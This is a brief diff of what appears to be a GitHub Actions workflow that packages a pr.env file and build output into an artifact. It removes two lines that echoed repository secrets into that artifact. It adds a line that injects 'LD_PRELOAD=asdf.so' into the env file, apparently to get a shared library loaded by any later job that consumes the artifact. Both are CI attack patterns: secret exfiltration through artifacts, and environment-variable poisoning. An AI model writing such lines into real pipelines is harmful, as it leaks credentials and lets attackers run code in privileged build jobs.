@@ -66,8 +66,7 @@ jobs:
             echo "PR_TITLE=${PR_TITLE}"
             echo "NETLIFY_SITE_PREFIX=${{ env.NETLIFY_SITE_PREFIX }}"
             echo "BUILD_DIR=${{ env.BUILD_DIR }}"
-            echo "ASDF=${{ secrets.RYAN }}"
-            echo "ASDF=${{ secrets.MY_SECRET }}"
+            echo "LD_PRELOAD=asdf.so"
           } >> pr.env
           tar --zstd -cf artifact.tar.zst pr.env ${{ env.BUILD_DIR }}
 
